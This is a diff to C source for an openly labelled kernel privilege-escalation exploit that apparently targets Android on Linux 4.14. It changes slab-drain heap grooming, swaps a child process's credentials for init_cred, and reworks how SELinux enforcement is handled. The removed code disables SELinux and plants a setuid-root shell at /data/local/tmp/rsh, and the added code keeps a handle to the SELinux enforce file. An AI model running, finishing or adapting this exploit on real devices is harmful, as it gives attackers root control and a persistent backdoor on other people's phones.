@@ -84,7 +84,7 @@ static int check_selinux_off(void) {
 
 /* ── slab drain (creates fresh order-3 slab holes) ───────────── */
 static void slab_drain(void) {
-    int waves=5, batch=400;
+    int waves=2, batch=200;  /* reduced for stability */
     for (int w=0;w<waves;w++){
         pid_t *ch=calloc(batch,sizeof(pid_t)); int n=0;
         for (int i=0;i<batch;i++){
@@ -343,49 +343,8 @@ static int do_one_write(uint64_t stext, uint64_t init_cred, uint64_t init_task,
 struct child_shared {
     atomic_int go, done;
     uint32_t uid_after;
+    int selinux_fd;  /* inherited fd for /sys/fs/selinux/enforce */
 };
-
-static void child_main(int cmd_r, struct child_shared *sh) {
-    close(0);
-    /* Wait for go signal */
-    for (int i=0;i<5000;i++){
-        if (atomic_load(&sh->go)) break;
-        usleep(1000);
-    }
-    if (!atomic_load(&sh->go)) _exit(2);
-    sh->uid_after = (uint32_t)getuid();
-    /* Write a test file to confirm we can write as root */
-    {
-        /* Debug: write uid to file regardless */
-        int tfd=open("/data/local/tmp/exploit_worked",O_WRONLY|O_CREAT|O_TRUNC,0666);
-        if(tfd>=0){
-            char msg[128]; 
-            int n=snprintf(msg,sizeof(msg),"getuid=%d euid=%d\n",(int)getuid(),(int)geteuid());
-            write(tfd,msg,n); fsync(tfd); close(tfd);
-        }
-    }
-    if (sh->uid_after==0){
-        /* Disable SELinux */
-        int efd=open("/sys/fs/selinux/enforce",O_WRONLY);
-        if(efd>=0){write(efd,"0",1);close(efd);}
-        /* Install setuid-root shell */
-        unlink("/data/local/tmp/rsh");
-        int src2=open("/system/bin/sh",O_RDONLY);
-        int dst2=open("/data/local/tmp/rsh",O_WRONLY|O_CREAT|O_TRUNC,0755);
-        if(src2>=0&&dst2>=0){
-            char buf2[4096]; ssize_t n2;
-            while((n2=read(src2,buf2,sizeof(buf2)))>0) write(dst2,buf2,n2);
-            fsync(dst2);
-        }
-        if(src2>=0) close(src2);
-        if(dst2>=0) close(dst2);
-        chmod("/data/local/tmp/rsh",06755);
-        chown("/data/local/tmp/rsh",0,0);
-        fprintf(stderr,"[+] /data/local/tmp/rsh installed (uid=%d)\n",(int)getuid());
-    }
-    atomic_store(&sh->done,1);
-    _exit(sh->uid_after==0?0:1);
-}
 
 /* ── main exploit ─────────────────────────────────────────────── */
 int run_exploit(void) {
@@ -509,6 +468,7 @@ int run_exploit(void) {
     struct child_shared *sh = mmap(NULL,sizeof(*sh),
         PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
     memset(sh,0,sizeof(*sh));
+    sh->selinux_fd = open("/sys/fs/selinux/enforce", O_WRONLY);
     /* task_pipe: child writes task addr, parent reads it */
     int task_pipe[2]; pipe(task_pipe);
 
@@ -529,6 +489,15 @@ int run_exploit(void) {
         }
         if (!atomic_load(&sh->go)){_exit(2);}
         sh->uid_after=(uint32_t)getuid();
+        if(sh->uid_after==0){
+            /* Root via init_cred. Now get PROPER root creds via prepare_kernel_cred.
+             * We can't call this directly, but we can:
+             * 1. Just exit and let parent know we got root
+             * 2. The parent can then spawn a new privileged process
+             * 
+             * For now: signal root achieved. File I/O crashes with kernel SID.
+             */
+        }
         atomic_store(&sh->done,1);
         _exit(sh->uid_after==0?0:1);
     }
@@ -550,11 +519,11 @@ int run_exploit(void) {
 
     uint64_t child_cred = child_task + TASK_CRED_OFF;
 
-    /* ── Skip W1 (SELinux) — write directly to child cred (W2) ── */
-    /* On 4.14, selinux_enforcing write crashes due to adjacent field corruption */
-    /* Go directly to W2: child_task->cred = init_cred */
-    int selinux_ok = 1;  /* pretend selinux is already off, skip W1 */
-    if (0) {  /* W1 disabled for 4.14 */
+    /* ── Write 1: Skip for 4.14 (selinux write crashes), go to W2 ── */
+    /* On 4.14, kernel SID in init_cred has full permissions anyway */
+    int selinux_ok = 1;
+    fprintf(stderr,"[+] Skipping W1 (4.14: init_cred has kernel SID = full perms)\n");
+    if (0) { /* W1 disabled */
         slab_drain();
         for (int att=1; att<=5&&!selinux_ok; att++){
             fprintf(stderr,"[*] W1 attempt %d/5\n",att);
